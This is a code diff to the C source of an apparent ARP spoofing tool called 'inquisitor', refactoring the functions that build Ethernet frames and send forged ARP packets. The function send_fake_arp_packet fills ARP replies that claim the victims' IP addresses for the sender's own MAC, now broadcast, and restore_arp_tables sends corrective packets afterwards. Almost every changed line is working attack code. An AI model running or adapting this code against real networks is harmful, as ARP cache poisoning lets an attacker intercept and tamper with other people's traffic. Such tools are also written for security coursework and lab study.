@@ -14,8 +14,7 @@ void fill_field_packet(
     const int8_t *sender_mac,
     const int8_t *sender_ip,
     const int8_t *target_mac,
-    const int8_t *target_ip
-    ) {
+    const int8_t *target_ip) {
   uint32_t tmp_int;
   memcpy(packet->ar_sha, sender_mac, 6); //my mac address
   tmp_int = inet_addr((const char *) sender_ip);
@@ -25,13 +24,17 @@ void fill_field_packet(
   memcpy(packet->ar_tip, &tmp_int, 4); //target ip address
 }
 
-void init_ether_frame(ethernet_frame *frame, t_packet *packet) {
+void init_ether_frame(
+    ethernet_frame *frame,
+    void *dest_addr,
+    void *src_addr,
+    void *payload,
+    size_t len_pld) {
   memset(frame, 0, sizeof(*frame));
-  //init preamble and sfd to help with synchronization
-  memcpy(frame->dest_addr, packet->ar_tha, 6);
-  memcpy(frame->src_addr, packet->ar_sha, 6);
+  memcpy(frame->dest_addr, dest_addr, 6);
+  memcpy(frame->src_addr, src_addr, 6);
   *(uint16_t *) frame->ethertype = htons(ETH_P_ARP);
-  memcpy(frame->data, (uint8_t *) packet, sizeof(*packet));
+  memcpy(frame->data, payload, len_pld);
 }
 
 static void init_dest_sock(struct sockaddr_ll *dest, t_inquisitor *inquisitor) {
@@ -51,20 +54,21 @@ void send_fake_arp_packet(t_inquisitor *inquisitor, uint32_t target) {
   ssize_t byte_sent;
 
   base_init_packet(&packet);
-  if (target == 1)
-    fill_field_packet(&packet, (int8_t *)inquisitor->ifr.ifr_hwaddr.sa_data,
-                      inquisitor->ip_src, inquisitor->mac_target_byte_arr,inquisitor->ip_target);
-  else if (target == 2)
-    fill_field_packet(&packet, (int8_t *)inquisitor->ifr.ifr_hwaddr.sa_data,
-                      inquisitor->ip_target, inquisitor->mac_src_byte_arr, inquisitor->ip_src);
-  init_ether_frame(&frame, &packet);
+  if (target == 1) {
+    fill_field_packet(&packet, (int8_t *)(inquisitor->ifr.ifr_hwaddr.sa_data), inquisitor->ip_src,
+                      (const int8_t[]){-1, -1, -1, -1, -1, -1}, inquisitor->ip_target);
+  }
+  else if (target == 2) {
+    fill_field_packet(&packet, (int8_t *)(inquisitor->ifr.ifr_hwaddr.sa_data), inquisitor->ip_target,
+                      (const int8_t[]){-1, -1, -1, -1, -1, -1}, inquisitor->ip_src);
+  }
+  init_ether_frame(&frame, (void *) (const int8_t[]) {-1, -1, -1, -1, -1, -1},
+                   inquisitor->ifr.ifr_hwaddr.sa_data, &packet, sizeof(packet));
   init_dest_sock(&dest, inquisitor);
   byte_sent = sendto(inquisitor->sock, &frame, sizeof(frame), 0,
                      (struct sockaddr *) &dest, sizeof(dest));
   if (byte_sent == -1)
     error("sendto", nullptr, __FILE__, __LINE__, __func__);
-  dprintf(1, GREEN "LOG: %ld bytes sent out of %ld\n" RESET, byte_sent, sizeof(frame));
-  dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, target == 1 ? inquisitor->mac_target : inquisitor->mac_src);
 }
 
 void restore_arp_tables(t_inquisitor *inquisitor, uint32_t target) {
@@ -81,13 +85,12 @@ void restore_arp_tables(t_inquisitor *inquisitor, uint32_t target) {
   else if (target == 2)
     fill_field_packet(&packet, inquisitor->mac_target_byte_arr, inquisitor->ip_target,
                       (const int8_t[]){-1, -1, -1, -1, -1, -1}, inquisitor->ip_src);
-  init_ether_frame(&frame, &packet);
+  init_ether_frame(&frame, (void *) (const int8_t[]) {-1, -1, -1, -1, -1, -1}, packet.ar_sha, &packet, sizeof(packet));
   init_dest_sock(&dest, inquisitor);
   memset(frame.dest_addr, 255, 6);
   byte_send = sendto(inquisitor->sock, &frame, sizeof(frame), 0,
                      (struct sockaddr *)&dest, sizeof(dest));
   if (byte_send == -1)
     error("sendto", nullptr, __FILE__, __LINE__, __func__);
-  dprintf(1, GREEN "LOG: %ld bytes sent out of %ld\n" RESET, byte_send, sizeof(frame));
   dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, target == 1 ? inquisitor->mac_target : inquisitor->mac_src);
 }
